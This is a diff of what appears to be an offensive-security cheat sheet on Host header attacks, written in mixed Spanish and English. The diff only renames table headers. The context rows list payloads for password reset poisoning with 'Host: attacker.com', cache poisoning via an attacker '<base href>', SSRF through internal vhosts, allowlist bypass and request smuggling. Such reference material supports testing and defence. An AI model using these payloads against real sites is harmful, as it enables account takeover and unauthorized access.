@@ -24,7 +24,7 @@ linked:
 
 ## Password Reset Poisoning Chain
 
-| **Workflow** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Stage 1: probe Host reflexion | Send normal reset → check email link | Recon. |
 | Stage 2: spoof Host | `POST /forgot` con `Host: attacker.com` | Inject. |
@@ -70,7 +70,7 @@ ___
 
 ## Cache Poisoning Combo
 
-| **Workflow** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Host (or XFH) reflected en cached response → cache stores poisoned response → all users see poisoned content | Mass impact. |
 | `<base href>` poison | XFH attacker → page cached con `<base href="https://attacker">` | Asset rerouting masivo. |
@@ -89,7 +89,7 @@ ___
 
 ## Internal SSRF via Virtual Host Routing
 
-| **Workflow** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Backend routes by Host. Internal vhosts not exposed externally. Atacante envía Host: internal-vhost → server respuesta con internal app | SSRF via routing. |
 | Internal admin | `Host: admin.internal.target` | Hidden admin panel. |
@@ -108,7 +108,7 @@ ___
 
 ## Authentication / IP Allowlist Bypass
 
-| **Workflow** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | App grants special trust based on Host or X-Forwarded-For. Atacante spoofs → bypass auth. | Trust-based bypass. |
 | Trusted Host bypass | App: "if Host == admin.internal, skip auth" → atacante spoofs | Direct ACL bypass. |
@@ -126,7 +126,7 @@ ___
 
 ## HTTP Request Smuggling Combo
 
-| **Workflow** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | HRS allows smuggle second request. Smuggled request con malicious Host → bypass front validation. | Compound. |
 | Smuggle Host injection | Second request `Host: internal.target` smuggled | Reach internal vhost. |
